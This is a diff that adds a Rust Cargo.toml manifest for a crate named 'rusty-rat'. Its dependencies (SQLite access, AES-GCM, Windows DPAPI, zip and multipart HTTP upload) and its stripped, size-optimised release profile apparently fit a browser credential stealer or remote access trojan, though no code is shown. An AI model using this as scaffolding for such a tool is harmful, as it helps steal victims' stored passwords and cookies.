@@ -1,0 +1,23 @@
+[package]
+name = "rusty-rat"
+version = "0.1.0"
+edition = "2021"
+
+# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
+
+[dependencies]  
+zip = "0.6.4"
+rusqlite = { version = "0.29.0", features = ["bundled"] }
+reqwest = { version = "0.11", features = ["blocking", "multipart"] }
+aes-gcm = "0.10.1"
+base64 = "0.21.0"
+regex = "1.7.3"
+[target.'cfg(windows)'.dependencies]
+winapi = { version = "0.3", default-features = false, features = ["dpapi"] }
+serde_json = "1.0.93"
+[profile.release]
+panic = "abort"
+strip = true
+opt-level = "z"
+lto = true
+codegen-units = 1
